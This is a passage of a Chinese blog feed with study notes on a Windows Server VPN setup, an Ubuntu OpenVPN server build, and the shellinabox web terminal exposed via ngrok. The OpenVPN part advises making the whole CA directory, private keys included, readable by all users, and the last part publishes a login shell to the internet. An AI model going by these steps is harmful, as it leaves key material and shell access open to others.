        <content type="html"><![CDATA[<h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>​    虚拟私人网络（Virtual Private Network，缩写为VPN）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用隧道协议（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果，这种技术可以用不安全的网络（例如：互联网）来发送可靠、安全的消息。</p><pre><code>通常情况下，VPN网关采取双网卡结构，外网卡使用公网IP接入Internet。</code></pre> <a id="more"></a><h1 id="二、搭建步骤"><a href="#二、搭建步骤" class="headerlink" title="二、搭建步骤"></a>二、搭建步骤</h1><ol><li>安装VPN服务，打开服务器管理器-添加角色</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps1.jpg" alt="img"> </p><ol start="2"><li>点击添加角色，下一步，勾选网络策略和访问服务，下一步是网络策略访问的简介</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps2.jpg" alt="img"> </p><ol start="3"><li>勾选网络策略服务器，和路由访问，然后下一步，继续安装</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps3.jpg" alt="img"> </p><ol start="4"><li>安装完成</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps4.jpg" alt="img"> </p><ol start="5"><li>安装完成之后，在服务器管理器中找到路由和远程访问，并且进行配置</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps5.jpg" alt="img"> </p><ol start="6"><li>配置点击下一步，选择自定义配置</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps6.jpg" alt="img"> </p><ol start="7"><li>然后下一步勾选VPN访问，点击完成即可！</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps7.jpg" alt="img"> </p><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps8.jpg" alt="img"> </p><ol start="8"><li>完成之后需要启动路由和远程访问功能</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps9.jpg" alt="img"> </p><ol start="9"><li>安装完成之后，开始配置VPN，找到路由和远程访问，IPV4展开之后，出现常规，选中常规右键新增路由协议</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps10.jpg" alt="img"> </p><ol start="10"><li>在添加的路由协议中，选择NAT路由协议。</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps11.jpg" alt="img"> </p><ol start="11"><li>上步选择了NAT，现在配置NAT，在NAT上右键新增接口</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps12.jpg" alt="img"> </p><ol start="12"><li>然后把“内部”接口也添加上，并“右键”——”属性“如下设置：</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps13.jpg" alt="img"> </p><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps14.jpg" alt="img"> </p><ol start="13"><li>创建VPN帐号，测试VPN服务器是否正常。在计算机右键管理，选择配置，本地用户和组，还要把拨入属性选项卡中的网络访问权限选择为 允许访问。</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps15.jpg" alt="img"> </p><ol start="14"><li>至此，完成了VPN服务器端的配置</li></ol><h1 id="三、连接测试"><a href="#三、连接测试" class="headerlink" title="三、连接测试"></a>三、连接测试</h1><p>​    使用另外一台不同网段的机器，新建VPN拨号连接，登录VPN服务器上的测试帐号</p><ol><li>配置连接属性</li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps16.jpg" alt="img"> </p><ol start="2"><li>开始连接 </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps17.jpg" alt="img"> </p><ol start="3"><li>连接成功 </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps18.jpg" alt="img"> </p><ol start="4"><li>查看IP </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps19.jpg" alt="img"> </p><ol start="5"><li>本机IP </li></ol><p><img src="/2019/04/07/Windows-2008-R2-搭建VPN服务/wps20.jpg" alt="img"> </p><p>至此，完成了VPN客户端的连接</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows Server </tag>
            
            <tag> OpenVPN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu16搭建OpenVPN服务</title>
      <link href="/2019/04/07/Ubuntu16%E4%B8%8B%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1/"/>
      <url>/2019/04/07/Ubuntu16%E4%B8%8B%E6%90%AD%E5%BB%BAOpenVPN%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="一、参考"><a href="#一、参考" class="headerlink" title="一、参考"></a>一、参考</h2><p><a href="https://blog.csdn.net/u012843189/article/details/77422505" target="_blank" rel="noopener">Ubuntu16.04搭建OpenVPN</a><br><a href="https://cndaqiang.github.io/2017/09/27/ubuntu1604-openvpn/" target="_blank" rel="noopener">Ubuntu16.04搭建openvpn服务器</a></p><h2 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h2><p>Ubuntu 16.10 yakkety (GNU/Linux 4.8.0-22-generic x86_64)</p><h2 id="三、介绍"><a href="#三、介绍" class="headerlink" title="三、介绍"></a>三、介绍</h2><p><strong>VPN</strong>（Virtual Private Network，虚拟私人网络）是一种常用于连接中、大型企业或团体与团体间的私人网络的通讯方法。它利用<a href="https://zh.wikipedia.org/wiki/%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">隧道协议</a>（Tunneling Protocol）来达到保密、发送端认证、消息准确性等私人消息安全效果，这种技术可以用不安全的网络（例如：互联网）来发送可靠、安全的消息。</p><h2 id="四、安装"><a href="#四、安装" class="headerlink" title="四、安装"></a>四、安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openvpn easy-rsa</span><br></pre></td></tr></table></figure><a id="more"></a><p><code>easy-rsa</code>内部CA（certificate authority）证书生成软件</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386400868.png" alt="1554386400868"></p><h2 id="五、证书制作"><a href="#五、证书制作" class="headerlink" title="五、证书制作"></a>五、证书制作</h2><h3 id="1-证书配置"><a href="#1-证书配置" class="headerlink" title="1. 证书配置"></a>1. 证书配置</h3><p>复制证书制作工具到文件夹(该文件夹应该不存在，复制后自动创建该文件夹)，<code>make-cadir</code>为easy-rsa安装后增加的命令 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make-cadir /etc/openvpn/ca</span><br><span class="line">cd /etc/openvpn/ca</span><br></pre></td></tr></table></figure><p>更改证书默认设置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim vars</span><br></pre></td></tr></table></figure><p>以下内容为证书的默认内容，可自定义，不能为空</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">export KEY_COUNTRY=&quot;US&quot;</span><br><span class="line">export KEY_PROVINCE=&quot;CA&quot;</span><br><span class="line">export KEY_CITY=&quot;SanFrancisco&quot;</span><br><span class="line">export KEY_ORG=&quot;Fort-Funston&quot;</span><br><span class="line">export KEY_EMAIL=&quot;me@myhost.mydomain&quot;</span><br><span class="line">export KEY_OU=&quot;MyOrganizationalUnit&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386592562.png" alt="1554386592562"></p><p>下面有个KEY_NAME，值可自定义，例如heiheihei</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KEY_NAME=&quot;heiheihei&quot;</span><br></pre></td></tr></table></figure><p>保存退出</p><p>现在可以使用刚才设置的变量，用easy-rsa包来制作CA。确保在CA目录下面，然后source编辑过的vars文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source vars</span><br></pre></td></tr></table></figure><p>如果source正确的话，会看到如下信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NOTE: If you run ./clean-all, I will be doing a rm -rf on /etc/openvpn/ca/keys</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554386666693.png" alt="1554386666693"></p><h3 id="2-CA证书"><a href="#2-CA证书" class="headerlink" title="2. CA证书"></a>2. CA证书</h3><p>CA数字证书认证机构,负责颁发证书，用于openvpn服务器和客户端的认证</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./clean-all//确保我们的操作处于一个clean环境中</span><br><span class="line">./build-ca//之后需要一直回车确认</span><br><span class="line">./build-ca [--batch]//保持默认设置，无须回车确认</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554387418885.png" alt="1554387418885"></p><h3 id="3-服务器证书"><a href="#3-服务器证书" class="headerlink" title="3. 服务器证书"></a>3. 服务器证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key-server --batch heiheihei</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554429618321.png" alt="1554429618321"></p><p>heiheihei为之前vars里<code>export KEY_NAME=&quot;heiheihei&quot;</code>的值，自定义后，后面需要修改服务器配置文件中相应内容。</p><p>client名称也可自定义,如果修改，最后在客户端配置文件中，也更改对应名称。</p><h3 id="4-制作Diffie-Hellman-key"><a href="#4-制作Diffie-Hellman-key" class="headerlink" title="4. 制作Diffie-Hellman key"></a>4. 制作Diffie-Hellman key</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-dh</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554429922860.png" alt="1554429922860"></p><p>等待几分钟时间完成</p><h3 id="5-生成HMAC签名加强TLS认证"><a href="#5-生成HMAC签名加强TLS认证" class="headerlink" title="5. 生成HMAC签名加强TLS认证"></a>5. 生成HMAC签名加强TLS认证</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openvpn --genkey --secret keys/ta.key</span><br></pre></td></tr></table></figure><h3 id="6-客户端证书"><a href="#6-客户端证书" class="headerlink" title="6. 客户端证书"></a>6. 客户端证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./build-key --batch client</span><br></pre></td></tr></table></figure><p>client名称可自定义,如果修改需要后面在客户端配置文件中，更改对应内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cert client.crt</span><br><span class="line">key client.key</span><br></pre></td></tr></table></figure><h2 id="六、服务端配置"><a href="#六、服务端配置" class="headerlink" title="六、服务端配置"></a>六、服务端配置</h2><h3 id="1-移动证书"><a href="#1-移动证书" class="headerlink" title="1. 移动证书"></a>1. 移动证书</h3><p>进入keys目录可以看到生成的证书文件 我们需要<strong>ca.crt ca.key heiheihei.crt heiheihei.key ta.key dh2048.pem</strong> ，heiheihei为之前自定义的服务器证书名</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554430607611.png" alt="1554430607611"></p><p>复制证书文件到/etc/openvpn 当前目录是<code>/etc/openvpn/ca/keys</code>，所以<code>../../</code>就是配置目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ca.crt ca.key uuu.crt uuu.key ta.key dh2048.pem ../../</span><br></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>复制配置文件模板到<code>/etc/openvpn/</code>,解压后修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/server.conf.gz .</span><br><span class="line">gzip -d server.conf.gz</span><br><span class="line">sudo vim server.conf</span><br></pre></td></tr></table></figure><p>以下内容替换为证书的路径名称，同路径下可直接写名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert server.crt</span><br><span class="line">key server.key </span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p>这里我替换成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca ca.crt</span><br><span class="line">cert heiheihei.crt</span><br><span class="line">key heiheihei.key</span><br><span class="line"></span><br><span class="line">dh dh2048.pem</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554430900402.png" alt="1554430900402"></p><p>如果服务器证书一开始就命名为server默认值，这里就不用修改了</p><p>去掉下面的注释，并再下一行添加<code>key-direction 0</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 0 # This file is secret</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431450577.png" alt="1554431450577"></p><p>最后，找到user和group参数，去除它们之前的<code>;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">;user nobody</span><br><span class="line">;group nogroup</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431475663.png" alt="1554431475663"></p><p><strong>（可选配置）推动DNS更改让VPN重定向所有流量</strong></p><p>上面的配置可以在客户端和服务器端上创建VPN连接，但是没有强迫连接去使用tunnel。如果希望用VPN来路由所有流量，需要更改客户端机器的DNS设置。</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431815982.png" alt="1554431815982"></p><p>这样就可以协助客户版重新配置DNS，以便使用VPN tunnel来作为默认网关。</p><p><strong>（可选配置）修改OpenVPN服务器的端口和协议</strong></p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554431906735.png" alt="1554431906735"></p><p>如果没有更换端口的需求，最好将上述的两项保持默认设置。</p><h3 id="3-防火墙设置"><a href="#3-防火墙设置" class="headerlink" title="3. 防火墙设置"></a>3. 防火墙设置</h3><h4 id="1-打开ip转发"><a href="#1-打开ip转发" class="headerlink" title="1. 打开ip转发"></a>1. 打开ip转发</h4><p>我们需要让服务器来转发流量，这是需要VPN服务器来提供的最基本的功能。可以通过修改/etc/sysctl.conf文件来调整网络设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/sysctl.conf</span><br></pre></td></tr></table></figure><p>取消注释<code>net.ipv4.ip_forward</code>，完成后保存并退出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.ip_forward=1</span><br></pre></td></tr></table></figure><p>读取sysctl.conf文件并且让调整后设置对当前系统的session生效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -p</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432065420.png" alt="1554432065420"></p><h4 id="2-添加规则"><a href="#2-添加规则" class="headerlink" title="2. 添加规则"></a>2. 添加规则</h4><p><strong>调整防火墙（UFW）规则</strong></p><p>配置防火墙规则来引导进入服务器的一些流量，需要修改防火墙规则文件来建立伪装规则，iptables的概念用于提供动态的NAT，从而正确地路由客户端连接。在打开防火墙配置文件以添加伪装规则之前，需要找到Ubuntu服务器的公共网络接口，输入如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip route | grep default</span><br></pre></td></tr></table></figure><p>公共网络接口应当紧跟在单词”dev”后面，例如，我的接口名字为ens33：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">default via 172.18.31.253 dev ens33</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432573267.png" alt="1554432573267"></p><p>打开/etc/ufw/before.rules这个文件并添加相应的规则：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/ufw/before.rules</span><br></pre></td></tr></table></figure><p>在最前面填入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># START OPENVPN RULES</span><br><span class="line"># NAT table rules</span><br><span class="line">*nat</span><br><span class="line">:POSTROUTING ACCEPT [0:0] </span><br><span class="line"># Allow traffic from OpenVPN client to eth0</span><br><span class="line">-A POSTROUTING -s 10.8.0.0/8 -o ens33 -j MASQUERADE</span><br><span class="line">COMMIT</span><br><span class="line"># END OPENVPN RULES</span><br></pre></td></tr></table></figure><p>其中10.8.0.0/8为openvpn客户端获取的ip，如在server.conf里面修改，此处应替换为相应ip，ens33为ubuntu连接网络的网卡</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432778966.png" alt="1554432778966"></p><p>然后告诉防火墙默认允许转发包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/default/ufw</span><br></pre></td></tr></table></figure><p>将</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;DROP&quot;</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DEFAULT_FORWARD_POLICY=&quot;ACCEPT&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554432909071.png" alt="1554432909071"></p><h4 id="3-开放端口"><a href="#3-开放端口" class="headerlink" title="3. 开放端口"></a>3. 开放端口</h4><p><strong>打开OpenVPN端口并且使变化生效</strong></p><p>调整防火墙本身，以允许流量到OpenVPN。如果在/etc/openvpn/server.conf文件中没有修改OpenVPN的端口号和协议类型，那么直接配置防火墙允许UDP流量到1194端口，如果改变了端口和协议类型，那么根据自己设置的端口和协议类型进行配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw allow 1194/udp</span><br><span class="line">sudo ufw allow OpenSSH</span><br></pre></td></tr></table></figure><p>  从所有修改过的文件中装载配置来关闭和重启防火墙：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br><span class="line">sudo ufw enable</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433320308.png" alt="1554433320308"></p><p>至此服务器端可以正确地处理OpenVPN流量了。</p><h2 id="七、启动OpenVPN服务"><a href="#七、启动OpenVPN服务" class="headerlink" title="七、启动OpenVPN服务"></a>七、启动OpenVPN服务</h2><p>在systemd单元文件的后面，可以通过指定特定的配置文件名来作为一个实例变量来开启OpenVPN服务，我们的配置文件名称为/etc/openvpn/server.conf，所以在systemd单元文件的后面添加@server来开启OpenVPN服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start openvpn@server</span><br><span class="line">sudo systemctl status openvpn@server</span><br></pre></td></tr></table></figure><p>如果一切正常的话，输出应当跟如下类似:</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433559377.png" alt="1554433559377"></p><p>通过<code>ifconfig</code>可以查看新增的ip为<code>inet addr:10.8.0.1</code>的<code>tun0</code>网卡</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433627533.png" alt="1554433627533"></p><p>或者</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show tun0</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554433680420.png" alt="1554433680420"></p><p>如果一切运行正常，将OpenVPN设置为开机自启动：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl enable openvpn@server</span><br></pre></td></tr></table></figure><h2 id="八、客户端配置"><a href="#八、客户端配置" class="headerlink" title="八、客户端配置"></a>八、客户端配置</h2><p><strong>制作客户端配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/openvpn/ca/keys</span><br><span class="line">cp /usr/share/doc/openvpn/examples/sample-config-files/client.conf .</span><br></pre></td></tr></table></figure><p>因为是一直root权限操作，所以ubuntu普通用户没有访问证书目录的权限，可赋予普通用户读取权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod -R +rx /etc/openvpn/ca/</span><br></pre></td></tr></table></figure><p>用scp等方法将keys中的客户端证书文件复制到客户端上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ca.crt</span><br><span class="line">ta.key </span><br><span class="line">client.crt </span><br><span class="line">client.key </span><br><span class="line">client.conf</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434147405.png" alt="1554434147405"></p><p>打开client.conf 将<code>remote my-server-1 1194</code>中<code>my-server-1</code> <code>1194</code>替换为服务器的ip/域名，端口，并去掉前面的分号</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434551477.png" alt="1554434551477"></p><p>去掉前面的分号</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434461184.png" alt="1554434461184"></p><p>设置证书地址,如果自定义了客户端证书名称自行更改</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434518742.png" alt="1554434518742"></p><p>删掉分号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;tls-auth ta.key 1</span><br></pre></td></tr></table></figure><p>并在下一行添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key-direction 1</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434639408.png" alt="1554434639408"></p><p>把client.conf命名为client.ovpn，然后将<strong>ca.crt ta.key client.crt client.key client.ovpn</strong>复制到客户端配置文件目录（此为windows环境下）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Program Files\OpenVPN\config</span><br></pre></td></tr></table></figure><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554434791663.png" alt="1554434791663"></p><h2 id="九、连接测试"><a href="#九、连接测试" class="headerlink" title="九、连接测试"></a>九、连接测试</h2><p>客户端可访问官网（需要FQ），或者通过第三方渠道下载安装</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554435021629.png" alt="1554435021629"></p><p>如图连接成功</p><p><img src="/2019/04/07/Ubuntu16下搭建OpenVPN服务/1554438169932.png" alt="1554438169932"></p><p>以上就是openvpn服务的搭建过程，如有不对遗漏之处，还望斧正，谢谢。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenVPN </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web终端之shellinabox（配合ngrok远程登陆）</title>
      <link href="/2019/03/21/Web%E7%BB%88%E7%AB%AF%E4%B9%8Bshellinabox%EF%BC%88%E9%85%8D%E5%90%88ngrok%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%89/"/>
      <url>/2019/03/21/Web%E7%BB%88%E7%AB%AF%E4%B9%8Bshellinabox%EF%BC%88%E9%85%8D%E5%90%88ngrok%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h2><p>Shellinabox 是一个基于 web 的终端模拟器，采用 C 语言编写，使用 Ajax 与后端服务通信。它实现了一个 Webserver，默认监听 4200 端口，在支持 Javascript 和 CSS 的浏览器上访问 <a href="http://host:4200" target="_blank" rel="noopener">http://host:4200</a> 即可。并且可以配置 SSL/TLS 证书，使用 https 方式加密通信。</p><h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get install shellinabox#Debian系</span><br><span class="line">yum install shellinabox#RHEL系</span><br></pre></td></tr></table></figure><h2 id="三、启动"><a href="#三、启动" class="headerlink" title="三、启动"></a>三、启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shellinaboxd -h#查看帮助信息</span><br><span class="line">shellinaboxd -b -t  #运行</span><br><span class="line">-b#在后台运行</span><br><span class="line">-t#使用基于http协议的终端</span><br></pre></td></tr></table></figure><a id="more"></a><p><strong>查看端口</strong></p><p>查看进程，是否启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntulp | grep shellinabox</span><br></pre></td></tr></table></figure><h2 id="四、配置"><a href="#四、配置" class="headerlink" title="四、配置"></a>四、配置</h2><h3 id="1-创建普通用户"><a href="#1-创建普通用户" class="headerlink" title="1. 创建普通用户"></a>1. 创建普通用户</h3><p>默认禁用root登陆，需要创建一个普通用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd username</span><br></pre></td></tr></table></figure><h3 id="2-修改配置文件"><a href="#2-修改配置文件" class="headerlink" title="2. 修改配置文件"></a>2. 修改配置文件</h3><p>可以需修改端口，或其他配置选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/default/shellinabox</span><br></pre></td></tr></table></figure><h2 id="五、登陆"><a href="#五、登陆" class="headerlink" title="五、登陆"></a>五、登陆</h2><p>局域网内访问  <a href="ip:4200" target="_blank" rel="noopener">ip:4200</a></p><p>输入用户名密码即可登陆</p><h2 id="六、内网映射（可选）"><a href="#六、内网映射（可选）" class="headerlink" title="六、内网映射（可选）"></a>六、内网映射（可选）</h2><h3 id="1-使用ngrok"><a href="#1-使用ngrok" class="headerlink" title="1.使用ngrok"></a>1.使用ngrok</h3><p><strong>使用ngrok，将基于WEB的终端映射到公网</strong></p><ol><li>访问<a href="https://www.ngrok.cc/user.html" target="_blank" rel="noopener">https://www.ngrok.cc/user.html</a> 注册 登录 找到”开通隧道”；</li><li>选择  <code>香港Ngrok免费服务器</code> ,在接下来的界面中选择隧道协议 <code>http</code> ,名称<code>shellinabox</code>（可随便填），前置域名 (不冲突即可)，本地端口(IP:PORT)被转发的ip和端口（不要填127.0.0.1），用户名密码可选填</li><li>在隧道管理中可以看到刚才建立的隧道，需要关注 <code>隧道ID</code>  <code>本地端口</code> 以及<code>域名</code> ，然后去下载Ngrok客户端</li><li>下载linux客户端，./sunny clientid 隧道ID</li><li>然后等待该隧道的建立  访问域名即可</li></ol><p><strong>ngrok.cc详细使用教程：<a href="http://www.ngrok.cc/_book/" target="_blank" rel="noopener">http://www.ngrok.cc/_book/</a></strong></p><h3 id="2-使用frp"><a href="#2-使用frp" class="headerlink" title="2.使用frp"></a>2.使用frp</h3><h3 id="3-使用花生壳"><a href="#3-使用花生壳" 